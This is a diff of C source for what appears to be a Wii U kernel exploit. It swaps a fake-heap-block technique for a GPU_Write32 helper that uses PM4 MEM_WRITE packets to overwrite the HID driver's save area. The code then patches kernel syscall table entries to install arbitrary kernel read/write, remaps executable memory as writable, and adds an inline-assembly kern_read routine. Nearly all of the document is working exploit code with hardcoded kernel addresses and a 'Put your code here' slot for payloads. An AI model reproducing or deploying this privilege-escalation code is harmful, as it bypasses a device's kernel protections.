@@ -65,10 +65,10 @@ void _start()
 	OSDynLoad_FindExport(vpad_handle, 0, "VPADRead", &VPADRead);
 
 	/* Kernel syscalls */
-	OSDriver_Register = (uint32_t (*)(char*, uint32_t, void*, void*))0x010277B8;
-	OSDriver_Deregister = (uint32_t (*)(char*, uint32_t))0x010277C4;
-	OSDriver_CopyToSaveArea = (uint32_t (*)(char*, uint32_t, void*, uint32_t))0x010277DC;
-	
+	OSDriver_Register = (uint32_t (*)(char* driver_name, uint32_t name_length, void* buffer1, void* buffer2))0x010277B8;
+	OSDriver_Deregister = (uint32_t (*)(char* driver_name, uint32_t name_length))0x010277C4;
+	OSDriver_CopyToSaveArea = (uint32_t (*)(char* driver_name, uint32_t name_length, void* buffer, uint32_t buffer_size))0x010277DC;
+
 	void *mem = OSAllocFromSystem(0x100, 64);
 	memset(mem, 0, 0x100);
 
@@ -81,88 +81,44 @@ void _start()
 	wait();
 	wait();
 
-	/* Our next kernel allocation (<= 0x4C) will be here */
-	OSDriver *driverhax =  (OSDriver*)OSAllocFromSystem(sizeof(OSDriver), 4);
-
-	/* Setup our fake heap block in the userspace at 0x1F200014 */
-	heap_block_t *heap_blk = (heap_block_t*)0x1F200014;
-	heap_blk->addr = (uint32_t)driverhax;
-	heap_blk->size = -0x4c;
-	heap_blk->prev_idx = -1;
-	heap_blk->next_idx = -1;
-
-	DCFlushRange(heap_blk, 0x10);
-
+	/* Alloc thread and stack */
 	OSContext *thread1 = (OSContext*)OSAllocFromSystem(0x1000, 32);
 	uint32_t *tdstack1 = (uint32_t *)OSAllocFromSystem(0x1000, 4);
 
-	/* *** Shutdown GX2 on its running core *** */
+	/* Shutdown GX2 on its running core */
 	OSCreateThread(thread1, GX2Shutdown, 0, NULL, tdstack1 + 0x400, 0x1000, 0, (1 << GX2GetMainCoreId()) | 0x10);
 	OSResumeThread(thread1);
 
 	/* Wait a bit */
 	wait();
 
-	/* Crafting our GPU packet */
-	uint32_t *pm4_packet = (uint32_t *)OSAllocFromSystem(32, 32);
-	pm4_packet[0] = make_pm4_type3_packet_header(MEM_SEMAPHORE, 2);	// 0xC0013900 | PM4 type3 packet header for Semaphore operations
-	pm4_packet[1] = KERNEL_HEAP_PHYS + FIRST_INDEX_OFFSET;   		// 0x1B800008 | Physical Address of the "semaphore"
-	pm4_packet[2] = SIGNAL_SEMAPHORE;								// 0xC0000000 | Signal = semaphore->count++;
-	for (int i = 0; i < 5; ++i)
-	{
-		pm4_packet[3 + i] = 0x80000000;
-	}
-
-	DCFlushRange(pm4_packet, 32);
-
+	/* Init GX2 on our core */
 	GX2Init(NULL);
 	ScreenInit();
 
-	GX2DirectCallDisplayList(pm4_packet, 32); // += 0x01000000
-	GX2DirectCallDisplayList(pm4_packet, 32); // += 0x01000000
+	/* HID driver hardcoded address */
+	OSDriver *driverhax =  (OSDriver*)0xFF245F3C;
 
-	GX2Flush();
+	/* patch HID driver save area */
+	GPU_Write32((uint32_t)&driverhax->save_area, KERNEL_SYSCALL_TABLE_5 + (0x34 * 4));
 
-	uint32_t *syscalls = OSAllocFromSystem(20, 4);
-	syscalls[0] = KERNEL_CODE_READ;		// Syscall 0x34
-	syscalls[1] = KERNEL_CODE_WRITE;	// Syscall 0x35
-	syscalls[2] = 0x01067544;			// Syscall 0x36 (blr) nullsub_1
-	syscalls[3] = 0x01067544;			// Syscall 0x37 (blr) nullsub_1
-	DCFlushRange(syscalls, 20);
+	print("Done patching HID driver");
 
-	/* Register DRVHAX (should be in userspace now) */
-	char drvname[6] = {'D', 'R', 'V', 'H', 'A', 'X'};
-	OSDriver_Register(drvname, 6, NULL, NULL);
+	uint32_t syscalls[2] = {KERNEL_CODE_READ, KERNEL_CODE_WRITE};
+	char drvname[3] = {'H', 'I', 'D'};
 
-	/* Patch Syscall Table 1 */
-	driverhax->save_area = KERNEL_SYSCALL_TABLE_1 + (0x34*4);
-	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);
-
-	/* Patch Syscall Table 2 */
-	driverhax->save_area = KERNEL_SYSCALL_TABLE_2 + (0x34*4);
-	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);
-
-	/* Patch Syscall Table 3 */
-	driverhax->save_area = KERNEL_SYSCALL_TABLE_3 + (0x34*4);
-	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);
-
-	/* Patch Syscall Table 4 */
-	driverhax->save_area = KERNEL_SYSCALL_TABLE_4 + (0x34*4);
-	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);
-
-	/* Patch Syscall Table 5 */
-	driverhax->save_area = KERNEL_SYSCALL_TABLE_5 + (0x34*4);
-	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 16);
-
-	/* Revert back kernel changes */
-	kern_write((void*)KERNEL_HEAP_VIRT + FIRST_INDEX_OFFSET, 0);
-	kern_write((void*)KERNEL_DRIVER_PTR, (uint32_t)driverhax->next_drv);
+	/* patch syscall table */
+	OSDriver_CopyToSaveArea(drvname, 3, syscalls, 8);
 
 	/* Map R-X memory as RW- elsewhere */
-//	kern_write((uint32_t*)KERNEL_ADDRESS_TABLE + 0x10, 0xA0000000); // Effective Address
-//	kern_write((uint32_t*)KERNEL_ADDRESS_TABLE + 0x11, 0x40000000); // Size
 	kern_write((uint32_t*)KERNEL_ADDRESS_TABLE + 0x12, 0x31000000); // Physical Address
 	kern_write((uint32_t*)KERNEL_ADDRESS_TABLE + 0x13, 0x28305800); // Flags (Same as MEM2)
+
+	/*
+	*
+	* Put your code here
+	*
+	*/
 
 	print("Press the HOME button to exit !");
 
@@ -174,9 +130,8 @@ void _start()
 
 		VPADRead(0, &vpad_data, 1, &error);
 		if (vpad_data.btn_hold & BUTTON_HOME)
-		{
 			break;
-		}
+		
 	}
 
 	for (int i = 0; i < 2; i++)
@@ -188,6 +143,34 @@ void _start()
 	_Exit();
 
 	while(1);
+
+}
+
+/* NOT OPTIMIZED AT ALL */
+uint32_t _byteswap_long(uint32_t val)
+{
+    val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF ); 
+    return (val << 16) | (val >> 16);
+}
+
+/* send a memory write gpu packet */
+void GPU_Write32(uint32_t vaddr, uint32_t data)
+{
+	uint32_t *pm4_packet = (uint32_t *)OSAllocFromSystem(32, 32);
+	pm4_packet[0] = make_pm4_type3_packet_header(MEM_WRITE, 4);
+	pm4_packet[1] = (uint32_t)OSEffectiveToPhysical((void*)vaddr) & ~3;
+	pm4_packet[2] = (1 << 18) | (0 << 17) | (0 << 16) | 0;
+	pm4_packet[3] = _byteswap_long(data);
+	pm4_packet[4] = 0;
+	for (int i = 0; i < 3; ++i)
+		pm4_packet[5 + i] = 0x80000000;
+
+	DCFlushRange(pm4_packet, 32);
+
+	GX2DirectCallDisplayList(pm4_packet, 32);
+	GX2Flush();
+
+	OSFreeToSystem(pm4_packet);
 
 }
 
@@ -231,6 +214,33 @@ void print(char *buf)
 	}
 
 	sy++;
+}
+
+/* Chadderz's kernel read function */
+uint32_t kern_read(const void *addr)
+{
+	uint32_t result;
+	asm(
+		"li 3,1\n"
+		"li 4,0\n"
+		"li 5,0\n"
+		"li 6,0\n"
+		"li 7,0\n"
+		"lis 8,1\n"
+		"mr 9,%1\n"
+		"li 0,0x3400\n"
+		"mr %0,1\n"
+		"sc\n"
+		"nop\n"
+		"mr 1,%0\n"
+		"mr %0,3\n"
+		:	"=r"(result)
+		:	"b"(addr)
+		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
+			"11", "12"
+	);
+
+	return result;
 }
 
 /* Chadderz's kernel write function */
